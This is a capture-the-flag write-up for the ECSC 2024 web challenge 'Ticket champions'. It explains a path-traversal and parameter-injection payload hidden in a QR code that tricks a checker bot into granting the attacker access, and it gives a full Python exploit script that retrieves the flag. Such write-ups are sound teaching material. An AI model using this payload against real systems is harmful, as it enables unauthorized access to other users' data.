# ECSC 2024 - Jeopardy

## [web] Ticket champions (28 solves)

I'm so hyped for the Linkin Park reunion that I'm waiting for the ticket to be available on the new Ticket champions shop!

Site: [https://ticket.challs.jeopardy.ecsc2024.it](https://ticket.challs.jeopardy.ecsc2024.it)

Bot: [https://ticket-bot.challs.jeopardy.ecsc2024.it](https://ticket-bot.challs.jeopardy.ecsc2024.it)

Author: Aleandro Prudenzano <@drw0if>

## Overview

The website allows you to buy tickets for some concerts, moreover we can add our own concerts, check our bookings and get the QR code to show at the entrance of the event.
If we own a concert we are also able to check the QR code of all the bookings on that concert.
Another thing that we can do is to add another user as a checker for the concerts we own.

In the end we are able to upload a QR code which then _should_ be checked by a checker (maybe the owner of the `flag` concert).

## Solution

Looking at the requests performed by the browser during the ticket check we can notice that the `serial` in the QR code is used to build a path, while the comment (if given) is added to the body as parameter.

Joining all together we can submit a QR code whit the following concent: `serial=../concert/1/checker&comment=%26username=<your username>`.
This way we force the checker to add us to the list of available accounts to check the target concert, and so get the flag in the secret of the concert.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
import random
import string
import requests
import qrcode
import time

def make_qr_code(content):
    FILENAME = "qr.pjpg"
    image = qrcode.make(content)
    image.save(FILENAME, format='JPEG')
    return FILENAME

def random_string():
    return ''.join(random.choices(string.ascii_letters, k=8))

logging.disable()

CHALL_URL = os.environ.get("URL", "https://ticket.challs.jeopardy.ecsc2024.it")
if CHALL_URL.endswith("/"):
    CHALL_URL = CHALL_URL[:-1]

BOT_URL = CHALL_URL.replace('ticket.', 'ticket-bot.')

def check():
    # Register
    s = requests.Session()
    username = random_string()
    password = random_string()

    r = s.post(f"{CHALL_URL}/api/v1/register/", data={
        "username": username,
        "password": password,
        "password_confirm": password
    }, verify=False)

    assert r.status_code == 201

    # Login
    r = s.post(f"{CHALL_URL}/api/v1/login/", data={
        "username": username,
        "password": password
    }, verify=False)

    assert r.status_code == 201

    status_token = r.json()["session_token"]

    # Report
    qr_code_img_name = make_qr_code(f"serial=../concert/1/checker&comment=%26username={username}")
    r = requests.post(f"{BOT_URL}/upload/", files={"qrImage": open(qr_code_img_name, 'rb')}, verify=False)

    assert "Ticket correctly checked" in r.text
    time.sleep(1)

    os.unlink(qr_code_img_name)

    # Get flag
    r = s.get(f"{CHALL_URL}/api/v1/user/concert/", headers={"Authorization": status_token}, verify=False)
    assert r.status_code == 200

    r = r.json()
    concert = r[0]
    flag = concert["secret_code"]

    print(flag)

if __name__ == "__main__":
    check()
```
